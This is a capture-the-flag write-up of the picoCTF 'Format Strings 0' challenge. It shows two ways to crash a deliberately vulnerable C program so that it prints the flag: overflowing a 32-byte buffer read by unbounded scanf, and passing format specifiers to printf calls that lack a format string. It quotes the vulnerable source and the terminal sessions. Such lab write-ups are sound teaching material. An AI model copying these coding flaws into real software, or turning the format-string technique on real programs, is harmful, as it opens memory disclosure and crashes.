# Format Strings 0
## Pico CTF -- Easy


Format Strings 0 is an easy fstrings challenge.


We are given the [compiled binary](format-string-0) and the [source code](format-string-0.c) so no reverse engineering is required.

Notice, we can print the flag by causing any segmentation fault.

    void sigsegv_handler(int sig) {
        printf("\n%s\n", flag);
        fflush(stdout);
        exit(1);
    }

The buffer size is 32 bytes:

    #define BUFSIZE 32

and there is nothing to limit our input in the serve_patrick() function

    char choice1[BUFSIZE];
    scanf("%s", choice1);

Hence, with a sufficently large input we can cause a seg fault and get the flag.

    Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
    Here comes the first customer Patrick who wants a giant bite.
    Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
    Enter your recommendation: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    There is no such burger yet!

    picoCTF{XXXXXXXXXXXXXXXXXXXXXX}


**Alternative Solution**

Notice also, the lack of format specifiers in the following printf function calls:

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1); // No format specifier
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }

    .
    .
    .

        char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2); // No format specifier
        fflush(stdout);
    }

By selecting 'Gr%114d_Cheese', the first printf call reads '%114d' and tries to print an integer padded to 114 characters.

printf returns the number of characters printed, which allows us to satisfy the condition

        int count = printf(choice1); // No format specifier
        if (count > 2 * BUFSIZE) {
            serve_bob();
        }

If we then select 'Cla%sic_Che%s%steak', the second printf inside serve_bob() reads multiple %s specifiers. When printf sees multiple %s specifiers, but is not provided with any corresponding variables to print, it will grab values from the stack and tread them as memory addreses to read values from.

Eventually, it reads from an invalid memory address and triggers SIGSEGV, giving us the flag.

    Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
    Here comes the first customer Patrick who wants a giant bite.
    Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
    Enter your recommendation: Gr%114d_Cheese
    Gr                                                                                                           4202954_Cheese
    Good job! Patrick is happy! Now can you serve the second customer?
    Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
    Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
    Enter your recommendation: Cla%sic_Che%s%steak
    ClaCla%sic_Che%s%steakic_Che
    picoCTF{XXXXXXXXXXXXXXXXXXXXXXXXXX}
